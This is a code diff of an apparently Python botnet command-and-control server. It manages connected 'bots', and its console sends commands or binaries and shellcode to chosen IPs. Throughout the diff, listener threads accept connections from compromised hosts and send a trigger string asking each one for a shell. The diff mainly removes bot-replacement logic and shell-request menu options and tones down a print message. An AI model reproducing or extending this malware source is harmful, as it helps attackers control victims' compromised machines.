@@ -477,35 +477,6 @@ def find_bot(portNumber):
             return bot
     return []
 
-"""
-Find a match_Ping_List
-
-The main reason behind this function is to find if I already have a bot created for the same IP
-If I do... I should replace all values.
-name = ip
-"""
-def find_PingBot_Replace(IPAddress,conn,addr):
-    for bot in PingBots:
-        # addr = bot.getConn()
-        # port = bot.addr()
-        ip = bot.getip()
-        if str(ip) == str(IPAddress):
-            # In this case when it find that I had this bot earlers.
-            # It should replace it
-
-            # Get the old value
-            connectToMEvalue = bot.getConnectToME()
-            # Remove the old bot.
-            PingBots.remove(bot)
-            # Create a new bot.
-            bot = Bot(conn, addr)
-            # Set the old value into the new bot.
-            bot.setConnectToME(connectToMEvalue)
-            PingBots.append(bot)
-            return bot
-    return None
-
-
 def help(type):
     if type == 0:
         print("list      List all bots\n"
@@ -514,7 +485,6 @@ def help(type):
               "C2I       Send a Command 2 one IP\n"
               "B2I       Send a Binary/Shellcode 2 one IP\n")
     pass
-
 
 """
 Wake up dead bots, by sending "1111" to the bot.
@@ -546,10 +516,6 @@ def console():
         if len(bot) >= 2:
             talk(bot)
             continue
-        elif Command == "1":
-            sendMeShells(1)
-        elif Command == "0":
-            sendMeShells(0)
         elif Command == "list":
             list()
         # Send a command to all bots
@@ -592,41 +558,20 @@ def pingSockFun(consoleT,pingSock):
     while consoleT.isAlive():
         try:
             pingConn, pingAddr = pingSock.accept()
-            ipAddress = pingAddr[0]
-            port = pingAddr[1]
-            print("\n" + str(ipAddress) + ":" + str(port) + " has connected - ping")
-
-            # In case this ip is already pwned
-            bot = find_PingBot_Replace(ipAddress, pingConn, pingAddr)
-
-            if bot == None:
-                # Send me a shell
-                SR("111111\n\0",pingConn,1024,0)
-                # Add it to the list to keep track of the flow.
-                PingBots.append(Bot(pingConn, pingAddr))
-
-            elif bot != None and bot.getConnectToME() == 1:
-                # Send me a shell
-                SR("111111\n\0",pingConn,1024,0)
-            else:
-                # Else means that :
-                # the value of ConnectToME is 0 and the bot exists
-                # So no need to do anything
-                # find_PingBot_Replace() will replace the old bot by the new one.
-                pass
-
-            # W8 two seconds then close the sock
-            time.sleep(2.0)
-            pingSock.close()
+            print("\n"+str(pingAddr[0])+":"+str(pingAddr[1])+" has connected - ping")
+            SR("111111\n\0",pingConn,1024,0)
+            PingBots.append(Bot(pingConn,pingAddr))
         except:
             pass
+    pingSock.close()
+
 
 
 def mainSockFun(consoleT,mainSock):
     while consoleT.isAlive():
         try:
             conn, addr = mainSock.accept()
-            print("\n"+str(addr[0])+":"+str(addr[1])+" has sent you a shell :). Go say thank you!")
+            print("\n"+str(addr[0])+":"+str(addr[1])+" has connected")
             bots.append(Bot(conn,addr))
         except:
             pass
@@ -649,12 +594,8 @@ def main():
     # REM
     time.sleep(1)
     global bots
-
-    # Start listing
     mainSock = start_listing(port)
     pingSock = start_listing(pingPort)
-
-    # Console
     consoleT = threading.Thread(target=console, args=())
     consoleT.daemon = True
     consoleT.start()
